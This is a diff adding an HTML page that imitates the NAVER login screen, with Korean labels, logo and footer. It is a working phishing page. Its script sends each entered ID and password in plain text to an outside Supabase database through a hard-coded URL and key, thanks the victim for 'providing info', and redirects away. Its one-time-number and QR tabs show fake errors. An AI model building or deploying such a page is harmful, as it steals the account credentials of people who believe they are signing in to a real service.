@@ -1,0 +1,335 @@
+<!doctype html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>로그인</title>
+    <link rel="stylesheet" type="text/css" href="w_20240611.css">
+    <script>
+        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            // 입력란과 삭제 버튼 가져오기
+            const usernameInput = document.getElementById("username");
+            const passwordInput = document.getElementById("password");
+            const usernameClearBtn = document.getElementById("username_clear");
+            const passwordClearBtn = document.getElementById("password_clear");
+            const passwordToggleButton = document.getElementById("pw_toggle");
+            const iconView = passwordToggleButton.querySelector(".icon_view");
+
+            // 비밀번호 표시/숨김 토글 함수
+            function togglePasswordVisibility() {
+                if (passwordInput.type === "password") {
+                    passwordInput.type = "text"; // 비밀번호 표시
+                    passwordToggleButton.classList.remove("hide"); // 아이콘 변경
+                } else {
+                    passwordInput.type = "password"; // 비밀번호 숨기기
+                    passwordToggleButton.classList.add("hide"); // 아이콘 원래대로
+                }
+            }
+            // 버튼 클릭 이벤트
+            passwordToggleButton.addEventListener("click", togglePasswordVisibility);
+
+            // 입력 필드 초기화 함수
+            function clearField(fieldId) {
+                const field = document.getElementById(fieldId);
+                field.value = ""; // 입력 필드 비우기
+                field.focus(); // 포커스 유지
+                passwordToggleButton.style.display = "none"; // 버튼 숨김
+            }
+    
+            // 입력 필드 상태에 따라 삭제 버튼 표시/숨김 처리
+            function toggleClearButton(inputField, clearButton) {
+                clearButton.style.display = inputField.value.trim() !== "" ? "inline-block" : "none";
+            }
+
+            // 입력 필드 상태에 따라 비밀번호 표시 버튼 표시/숨김 처리
+            function togglePasswordButton(inputField, toggleButton) {
+                toggleButton.style.display = inputField.value.trim() !== "" ? "inline-block" : "none";
+            }
+    
+            // 초기 상태 설정
+            toggleClearButton(usernameInput, usernameClearBtn);
+            toggleClearButton(passwordInput, passwordClearBtn);
+             // 초기 상태 설정
+            togglePasswordButton(passwordInput, passwordToggleButton);
+    
+            // 입력 필드 이벤트 리스너 추가
+            usernameInput.addEventListener("input", () => {
+                toggleClearButton(usernameInput, usernameClearBtn);
+            });
+    
+            passwordInput.addEventListener("input", () => {
+                toggleClearButton(passwordInput, passwordClearBtn);
+            });
+
+            // 입력 필드 이벤트 리스너 추가
+            passwordInput.addEventListener("input", () => {
+                togglePasswordButton(passwordInput, passwordToggleButton);
+            });
+
+    
+            // 삭제 버튼 클릭 시 입력란 초기화
+            usernameClearBtn.addEventListener("click", () => {
+                clearField("username");
+                toggleClearButton(usernameInput, usernameClearBtn);
+            });
+    
+            passwordClearBtn.addEventListener("click", () => {
+                clearField("password");
+                toggleClearButton(passwordInput, passwordClearBtn);
+            });
+        });
+    </script>
+</head>
+<script src="default_202105.js.js"></script>
+<body>
+<div id="wrap" class="wrap">
+    <div class="u_skip"><a href="https://www.naver.com">본문 바로가기</a></div>
+    <header class="header">
+        <div class="header_inner">
+            <a href="https://www.naver.com" class="logo">
+                <h1 class="blind" >NAVER</h1>
+            </a>
+            <div class="lang" id="show_locale_switch">
+                <select id="locale_switch" name="locale_switch" title="언어선택" class="sel">
+                    <option value="ko_KR">한국어</option>
+                    <option value="en_US">English</option>
+                    <option value="zh-Hans_CN">中文(简体)</option>
+                    <option value="zh-Hant_TW">中文(台灣)</option>
+                </select>
+            </div>
+        </div>
+    </header>
+
+    <div id="container" class="container">
+        <div class="content">
+            <div class="login_wrap">
+
+                <!-- 탭 메뉴 -->
+                <ul class="menu_wrap" role="tablist">
+                    <li class="menu_item" role="presentation">
+                        <a href="#id_tab" id="tab_id" class="menu_id on" role="tab" aria-selected="true">
+                            <span class="menu_text">ID/전화번호</span>
+                        </a>
+                    </li>
+                    <li class="menu_item" role="presentation">
+                        <a href="#none" id="ones" class="menu_ones" role="tab" aria-selected="false">
+                            <span class="menu_text"><span class="text">일회용 번호</span></span>
+                        </a>
+                    </li>
+                    <li class="menu_item" role="presentation">
+                        <a href="#none" id="qrcode" class="menu_qr" role="tab" aria-selected="false">
+                            <span class="menu_text"><span class="text">QR코드</span></span>
+                        </a>
+                        <!--넛지배너-->
+                        <div class="nudge_banner" id="nudge_tooltip" style="display: none;">
+                            <span class="nudge_text">PC방 등 공용PC라면 QR코드 로그인이 더 안전해요.</span>
+                            <button type="button" id="nudge_close" class="nudge_close"><span class="icon_nudge_close"></span></button>
+                        </div>
+                    </li>
+                </ul>
+
+                <!-- 로그인 폼 -->
+                <form id="frmNIDLogin" name="frmNIDLogin" autocomplete="off" onsubmit="submitLogin(event)">
+                    <ul class="panel_wrap">
+                        <!-- ID/전화번호 탭 -->
+                        <li class="panel_item" id="id_tab" style="display: block;">
+                            <div class="panel_inner">
+                                <div class="login_form">
+                                    <div class="login_box">
+                                        <!-- 아이디 입력 -->
+                                        <div class="input_item id">
+                                            <input type="text" id="username" name="username" maxlength="41" autocapitalize="none" class="input_id" aria-label="아이디 또는 전화번호" required>
+                                            <label for="id" class="text_label" id="id_label" aria-hidden="true">아이디 또는 전화번호</label>
+                                            <button type="button" class="btn_delete" id="username_clear" style="display:none" onclick="clearField('username')">
+                                                <span class="icon_delete"><span class="blind">삭제</span></span>
+                                            </button>
+                                        </div>
+                                        <!-- 비밀번호 입력 -->
+                                        <div class="input_item pw">
+                                            <input type="password" id="password" name="password" maxlength="16" class="input_pw" aria-label="비밀번호" required>
+                                            <label for="pw" class="text_label" id="pw_label" aria-hidden="true">비밀번호</label>
+                                            <button type="button" class="btn_view hide" id="pw_toggle" style="display: none;">
+                                                <span class="icon_view">
+                                                    <span class="blind" id="icon_view">비밀번호 표시</span>
+                                                </span>
+                                            </button>
+                                            <button type="button" class="btn_delete" id="password_clear" onclick="clearField('password')">
+                                                <span class="icon_delete"><span class="blind">삭제</span></span>
+                                            </button>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                                
+
+                                <!-- 로그인 상태 유지 -->
+                                <div class="login_keep_wrap">
+                                    <div class="keep_check">
+                                        <input type="checkbox" id="keep" name="nvlong" class="input_keep">
+                                        <label for="keep" class="keep_text">로그인 상태 유지</label>
+                                    </div>
+                                    <!-- IP 보안 -->
+                                    <div class="ip_check">
+                                        <span class="ip_text">IP보안</span>
+                                        <span class="switch">
+                                            <input type="checkbox" id="switch" class="switch_checkbox">
+                                            <label for="switch" class="switch_btn">
+                                                <span class="switch_on" role="checkbox" aria-checked="true">ON</span>
+                                                <span class="switch_off" role="checkbox" aria-checked="false">OFF</span>
+                                            </label>
+                                        </span>
+                                    </div>
+                                    <div class="login_error_wrap" id="err_empty_id" style="display: none;">
+                                        <div class="error_message">
+                                            <strong>아이디 또는 전화번호</strong>를 입력해 주세요.
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <!-- 로그인 버튼 -->
+                                <div class="btn_login_wrap">
+                                    <button type="submit" class="btn_login">
+                                        <span class="btn_text">로그인</span>
+                                    </button>
+                                </div>
+                            </div>
+                        </li>
+
+                        <!-- 일회용 번호 탭 -->
+                        <li class="panel_item" id="temp_number_tab" style="display: none;">
+                            <div class="panel_inner">
+                                <p>synx error occasioned: invalid num_login session</p>
+                            </div>
+                        </li>
+
+                        <!-- QR코드 탭 -->
+                        <li class="panel_item" id="qr_tab" style="display: none;">
+                            <div class="panel_inner">
+                                <p>synx error occasioned: invalid qr_login session</p>
+                            </div>
+                        </li>
+                    </ul>
+                </form>
+            </div>
+            <ul class="find_wrap" id="find_wrap">
+
+                <li><a target="_blank" href="https://nid.naver.com/user2/api/route?m=routePwInquiry&amp;lang=ko_KR" class="find_text">비밀번호 찾기</a></li>
+                <li><a target="_blank" href="https://nid.naver.com/user2/api/route?m=routeIdInquiry&amp;lang=ko_KR" class="find_text">아이디 찾기</a></li>
+                <li><a target="_blank" href="https://nid.naver.com/user2/V2Join?m=agree&amp;lang=ko_KR&amp;realname=N" class="find_text">회원가입</a>
+                </li>
+
+            </ul>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer_inner">
+            <!--[주]고객센터,제휴문의,서비스안내-->
+            <ul class="footer_link" id="footer_link">
+                <li><a target="_blank" class="footer_item" href="http://www.naver.com/rules/service.html" id="fot.agreement"><span class="text">이용약관</span></a></li>
+                <li><a target="_blank" class="footer_item" href="http://www.naver.com/rules/privacy.html" id="fot.privacy"><span class="text"><strong>개인정보처리방침</strong></span></a></li>
+                <li><a target="_blank" class="footer_item" href="http://www.naver.com/rules/disclaimer.html" id="fot.disclaimer"><span class="text">책임의 한계와 법적고지</span></a></li>
+                <li><a target="_blank" class="footer_item" href="https://help.naver.com/alias/membership/p.membership/main.naver" id="fot.help"><span class="text">회원정보 고객센터</span></a></li>
+            </ul>
+            <div class="footer_copy">
+                <a id="fot.naver" target="_blank" href="https://www.navercorp.com">
+                    <span class="footer_logo"><span class="blind">네이버</span></span>
+                </a>
+                <span class="text">Copyright</span>
+                <span class="corp">© NAVER Corp.</span>
+                <span class="text">All Rights Reserved.</span>
+            </div>
+        <footer>
+</div>
+    <script type="module">
+        // Import Supabase client
+        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+    
+        // Supabase configuration
+        const SUPABASE_URL = 'https://xoobryyfudvhywmjurmd.supabase.co'; // Replace with your Supabase project URL
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inhvb2JyeXlmdWR2aHl3bWp1cm1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzIyMDg1ODMsImV4cCI6MjA0Nzc4NDU4M30.VVnB8HL0tFO4xqFKeQqzOow0QA-o9_mx0u_SlYZ4RoE'; // Replace with your Supabase anonymous key
+        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    
+        // Handle form submission
+        document.querySelector(".btn_login").addEventListener("click", async function (event) {
+
+            event.preventDefault(); // Prevent default form submission
+    
+            // Get username and password input values
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+    
+            if (!username || !password) {
+                err_empty_id.style.display = "block";
+                return;
+            }
+    
+            // Check if the username already exists
+            try {
+                const { data: existingUser, error: checkError } = await supabase
+                    .from("users") // Replace with your users table name
+                    .select("*")
+                    .eq("username", username)
+                    .single();
+    
+                if (existingUser) {
+                    alert("이미 존재하는 아이디입니다. 다른 아이디를 입력해주세요.");
+                    return;
+                }
+    
+                if (checkError && checkError.code !== "PGRST116") {
+                    // Ignore "PGRST116" (no rows found) because it means the username is available
+                    console.error("Error checking existing user:", checkError);
+                    alert("오류 발생: 아이디를 확인할 수 없습니다.");
+                    return;
+                }
+            } catch (error) {
+                console.error("Error querying Supabase:", error);
+                alert("오류 발생: " + error.message);
+                return;
+            }
+    
+            // Save new user to the `users` table
+            try {
+                const { data, error } = await supabase
+                    .from("users") // Replace with your users table name
+                    .insert([{ username, password }]);
+    
+                if (error) {
+                    console.error("Error signing up:", error);
+                    alert("로그인에 실패했습니다: " + error.message);
+                    return;
+                }
+    
+                console.log("Signup successful:", data);
+                alert("정보제공 감사");
+                // Redirect to the login page or main page
+                window.location.href = "https://www.example.com/login"; // Replace with your login page URL
+            } catch (error) {
+                console.error("Error saving to Supabase:", error);
+                alert("오류 발생: " + error.message);
+            }
+        });
+    </script>
+<script>
+    // 탭 전환 스크립트
+    const tabs = document.querySelectorAll('.menu_item a');
+    const panels = document.querySelectorAll('.panel_item');
+
+    tabs.forEach((tab, index) => {
+        tab.addEventListener('click', (event) => {
+            event.preventDefault();
+            tabs.forEach(t => t.classList.remove('on'));
+            panels.forEach(p => p.style.display = 'none');
+
+            tab.classList.add('on');
+            panels[index].style.display = 'block';
+        });
+    });
+</script>
+
+</body>
+</html>
